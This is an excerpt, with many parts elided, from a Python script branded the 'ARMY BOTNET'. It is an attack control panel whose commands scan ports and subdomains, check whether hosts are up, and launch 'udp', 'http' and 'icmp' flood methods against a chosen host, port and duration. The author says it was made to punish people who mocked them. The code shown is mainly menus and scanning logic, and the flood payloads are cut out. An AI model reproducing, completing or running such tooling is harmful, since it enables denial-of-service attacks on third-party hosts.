...
sys.stdout.write("\x1b]2;A R M Y |ARMY| B O T N E T\x07")
def modifications():
	print ("Contact sl4vuni0n69 if you need help")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mARMY METHODS\033[91m                     ║               
║══════════════════════════════════════════════════════║
...
info = """
[\033[91mSIN\033[00m] \033[91mMade By sl4vuni0n69, I created this botnet because I am sick and tired of getting called a skid and bullied so I made this to teach a lesson.
...
altbanner = """
		      ...
		      Skids people are punished put in hell
		      		  A R M Y B O T N E T
"""
...
def main():
	...
	while True:
		sys.stdout.write("\x1b]2;A R M Y N E T\x07")
		sin = input("\033[1;00m[\033[91mARMY\033[1;00m]-\033[91m家\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (altbanner)
			...
			def scan(port, ip):
				try:
					...
					print ("[\033[91mARMY\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
			...
			sfound = 0
			sys.stdout.write("\x1b]2;A R M Y |{}| F O U N D\x07".format (sfound))
			try:
				host = sin.split(" ")[1]
				...
				for link in domains:
					try:
						...
						pass
						#print ("[\033[91mARMY\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[91mARMY\033[00m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolve":
			...
			print ("[\033[91mARMY\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mARMY\033[00m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mARMY\033[00m] Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						...
						sys.stdout.write("\x1b]2;A R M Y|{}ms| B O T N E T\x07".format (stop))
						print ("Army: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;ARMY |TIME OUT| B O T N E T\x07")
						print ("Army: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mARMY\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[91mARMY\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					...
					print ("[\033[91mARMY\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
			...
			if username == "guests":
				...
				try:
					...
					print ("[\033[91maARMY\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mARMY\033[00m] Host: {} invalid".format (host))
					main()
			...
			if what == "udp":
				...
				while not udp:
					if aid == 0:
						print ("[\033[91mARMY\033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				...
				icmp = False
				while not icmp:
					print ("[\033[91mARMY\033[00m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[91mARMY\033[00m] {} Not a command".format(sinput))
			main()
	...
	if user == "root":
		if password == passwords[0]:
			...
			try:
				...
				print ("\n[\033[91mARMY\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
